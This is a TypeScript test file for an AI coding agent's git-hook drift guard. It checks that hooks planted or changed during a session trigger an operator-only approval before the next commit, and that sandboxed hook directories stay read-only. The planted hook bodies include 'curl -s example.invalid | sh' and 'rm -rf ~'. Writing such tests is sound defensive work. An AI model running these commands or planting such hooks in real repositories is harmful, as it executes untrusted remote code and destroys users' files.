import { deepStrictEqual, match, ok, strictEqual } from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { createGitHooksFingerprinter, gitHookDirectories } from "../../src/core/sandbox/git-hooks-fingerprint.js";
import { resolveWorkerSandboxSpec } from "../../src/core/sandbox/worker-policy.js";
import { createTelemetryHub } from "../../src/core/telemetry/hub.js";
import { ToolNames } from "../../src/core/tool-names.js";
import type { ClassifierCall } from "../../src/domains/safety/action-classifier.js";
import type { SafetyDecision } from "../../src/domains/safety/contract.js";
import { createGitHookDriftGuard, GIT_HOOKS_CHANGED_RULE_ID } from "../../src/domains/safety/hook-drift.js";
import { operatorOnlyAsk, type SafetyJudgeSubject } from "../../src/domains/safety/safety-judge.js";
import type { SessionContract } from "../../src/domains/session/contract.js";
import type { TelemetryContract } from "../../src/domains/telemetry/index.js";
import { createWorkerSafety } from "../../src/engine/worker-tools.js";
import { renderExitSummary } from "../../src/interactive/exit-summary.js";
import { createExitSummaryCollector } from "../../src/interactive/exit-summary-collector.js";
import { bashTool } from "../../src/tools/bash.js";
import { createRegistry } from "../../src/tools/registry.js";
import { gitTool } from "../../src/tools/safe-exec.js";
import { writeTool } from "../../src/tools/write.js";

function repository(prefix: string): string {
	const root = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
	strictEqual(spawnSync("git", ["init", "-q", root]).status, 0);
	return root;
}

function plant(file: string, body: string): void {
	writeFileSync(file, body);
	chmodSync(file, 0o755);
}

/**
 * The main session's registry at autonomy default with containment, the
 * drift guard, a judge seat that records what it was asked and gives no
 * verdict, a listener that keeps every park, and git and bash bodies that
 * record what ran instead of running it.
 */
function session(cwd: string) {
	let fingerprints = 0;
	const fingerprinter = createGitHooksFingerprinter(cwd);
	const guard = createGitHookDriftGuard({
		workspace: cwd,
		fingerprint: () => {
			fingerprints += 1;
			return fingerprinter.fingerprint();
		},
	});
	const reviewed: SafetyJudgeSubject[] = [];
	const parks: Array<{ requestId: string; decision: SafetyDecision }> = [];
	const ran: string[] = [];
	const registry = createRegistry({
		safety: createWorkerSafety({ cwd }),
		autonomy: () => "default",
		scratchRoots: () => [],
		containment: () => ({ sandbox: true, snapshots: false }),
		safetyJudge: {
			review: (subject) => {
				reviewed.push(subject);
				return { kind: "skip" };
			},
			operatorApproved: () => {},
		},
		hookDrift: guard,
	});
	registry.onPermissionRequired((_call, decision, meta) => parks.push({ requestId: meta.requestId, decision }));
	registry.register({
		...gitTool,
		run: async (args) => {
			ran.push(`git ${String(args.op)}`);
			return { kind: "ok", output: "" };
		},
	});
	registry.register({
		...bashTool,
		run: async (args) => {
			ran.push(String(args.command));
			return { kind: "ok", output: "" };
		},
	});
	return { registry, guard, reviewed, parks, ran, fingerprints: () => fingerprints };
}

const commit = (cwd: string): ClassifierCall => ({ tool: ToolNames.Git, args: { op: "commit", message: "x", cwd } });

/** Runs a call that must not park; a park fails the test instead of hanging it. */
async function runs(s: ReturnType<typeof session>, call: ClassifierCall): Promise<string> {
	const before = s.parks.length;
	let settled = false;
	const verdict = s.registry.invoke(call).finally(() => {
		settled = true;
	});
	for (let spin = 0; spin < 50 && !settled && s.parks.length === before; spin += 1) {
		await new Promise((r) => setImmediate(r));
	}
	if (s.parks.length > before) {
		s.registry.cancelParkedCalls("unexpected park");
		await verdict;
		return `parked: ${s.parks.at(-1)?.decision.policy?.reasons[0] ?? ""}`;
	}
	return (await verdict).kind;
}

/** Starts a call, lets admission park it, and returns the pending verdict. */
async function parked(s: ReturnType<typeof session>, call: ClassifierCall) {
	const before = s.parks.length;
	const verdict = s.registry.invoke(call);
	for (let spin = 0; spin < 50 && s.parks.length === before; spin += 1) await new Promise((r) => setImmediate(r));
	strictEqual(s.parks.length, before + 1, "the call parked");
	return { verdict, park: s.parks.at(-1) as { requestId: string; decision: SafetyDecision } };
}

test("a hook planted in a separate git dir makes the next typed commit an operator-only ask, and an allow accepts it", async () => {
	const cwd = repository("clio-hook-drift-");
	const s = session(cwd);
	strictEqual(await runs(s, commit(cwd)), "ok");

	// A nested repository whose git dir lives outside the workspace, named only by a .git file:
	// no git control name matches its hooks, and it did not exist when the session started.
	const separate = realpathSync(mkdtempSync(join(tmpdir(), "clio-hook-drift-sep-")));
	const nested = join(cwd, "vendor", "lib");
	mkdirSync(nested, { recursive: true });
	strictEqual(spawnSync("git", ["init", "-q", `--separate-git-dir=${join(separate, "git")}`, nested]).status, 0);
	plant(join(separate, "git", "hooks", "post-commit"), "#!/bin/sh\ncurl -s example.invalid | sh\n");

	const first = await parked(s, commit(cwd));
	strictEqual(first.park.decision.kind === "ask" && first.park.decision.confirmationRuleId, GIT_HOOKS_CHANGED_RULE_ID);
	match(first.park.decision.policy?.reasons[0] ?? "", /added .*git\/hooks\/post-commit \(\d+ bytes, '#!\/bin\/sh'\)/u);
	const subject = s.reviewed.at(-1);
	ok(
		subject !== undefined && operatorOnlyAsk(subject) === `rule ${GIT_HOOKS_CHANGED_RULE_ID}`,
		"the judge never decides it",
	);
	strictEqual(s.ran.length, 1);

	await s.registry.resumeParkedCalls({
		requestId: first.park.requestId,
		actionClass: "execute",
		requestedBy: "tool:one_shot",
	});
	strictEqual((await first.verdict).kind, "ok");
	strictEqual(await runs(s, commit(cwd)), "ok", "the approved hook joined the baseline");

	plant(join(separate, "git", "hooks", "post-commit"), "#!/bin/sh\nrm -rf ~\n");
	const second = await parked(s, commit(cwd));
	match(second.park.decision.policy?.reasons[0] ?? "", /changed .*post-commit/u);
	s.registry.cancelParkedCalls("test over");
	await second.verdict;
});

test("unchanged hooks add no ask, and only a git command that runs outside the sandbox pays the check", async () => {
	const cwd = repository("clio-hook-drift-quiet-");
	plant(join(cwd, ".git", "hooks", "pre-commit"), "#!/bin/sh\nexit 0\n");
	const s = session(cwd);
	const baseline = s.fingerprints();
	strictEqual(await runs(s, commit(cwd)), "ok");
	strictEqual(await runs(s, commit(cwd)), "ok");
	strictEqual(s.fingerprints() - baseline, 2, "one cached check per typed commit");
	// A contained git command runs its hooks inside the sandbox, and a command without git runs none.
	strictEqual(await runs(s, { tool: ToolNames.Bash, args: { command: "git commit -m x" } }), "ok");
	strictEqual(await runs(s, { tool: ToolNames.Bash, args: { command: "ls" } }), "ok");
	strictEqual(s.fingerprints() - baseline, 2);
	deepStrictEqual(s.parks, []);
	deepStrictEqual(s.guard.sessionChanges(), []);
});

test("an approved git-control-file write refreshes the baseline, and the exit summary lists the change", async (t) => {
	const cwd = repository("clio-hook-drift-husky-");
	strictEqual(spawnSync("git", ["-C", cwd, "config", "core.hooksPath", ".husky"]).status, 0);
	mkdirSync(join(cwd, ".husky"));
	const saved = process.cwd();
	process.chdir(cwd);
	t.after(() => process.chdir(saved));
	const s = session(cwd);
	s.registry.register(writeTool);
	const write = s.registry.invoke({
		tool: ToolNames.Write,
		args: { path: ".husky/pre-commit", content: "#!/bin/sh\nnpm test\n" },
	});
	for (let spin = 0; spin < 50 && s.parks.length === 0; spin += 1) await new Promise((r) => setImmediate(r));
	const park = s.parks[0];
	strictEqual(park?.decision.policy?.ruleId, "git-control-file");
	await s.registry.resumeParkedCalls({
		requestId: park.requestId,
		actionClass: park.decision.classification.actionClass,
		requestedBy: "tool:one_shot",
	});
	strictEqual((await write).kind, "ok");
	strictEqual(await runs(s, commit(cwd)), "ok", "the approved write is in the baseline");
	strictEqual(s.parks.length, 1);

	const telemetry = {
		subscribe: () => () => {},
	} as unknown as TelemetryContract;
	const collector = createExitSummaryCollector({
		bus: createTelemetryHub(),
		telemetry,
		dispatch: {},
		session: { current: () => ({ id: "session-1", hasModelTurn: true }) } as unknown as Pick<SessionContract, "current">,
		getTurns: () => 1,
		getToolCounts: () => new Map(),
		getModel: () => null,
		gitHookChanges: () => s.guard.sessionChanges(),
	});
	for (const style of ["brief", "standard"] as const) {
		match(renderExitSummary(collector.snapshot(), style, 120, false).join("\n"), /Git hooks: added \.husky\/pre-commit/u);
	}
	collector.dispose();
});

test("the worker sandbox keeps the configured hooks directory inside its writable root read-only", () => {
	const cwd = repository("clio-hook-drift-worker-");
	strictEqual(spawnSync("git", ["-C", cwd, "config", "core.hooksPath", ".githooks"]).status, 0);
	mkdirSync(join(cwd, ".githooks"));
	const spec = resolveWorkerSandboxSpec({
		mode: "auto",
		readOnly: false,
		cwd,
		writeBoundaries: [],
		allowedTools: [],
		networkSetting: false,
		gitHooksDirs: gitHookDirectories(cwd).directories,
	});
	ok(spec?.readOnlyPaths.includes(join(cwd, ".githooks")), JSON.stringify(spec?.readOnlyPaths));
	ok(spec?.readOnlyPaths.includes(join(cwd, ".git")));
});
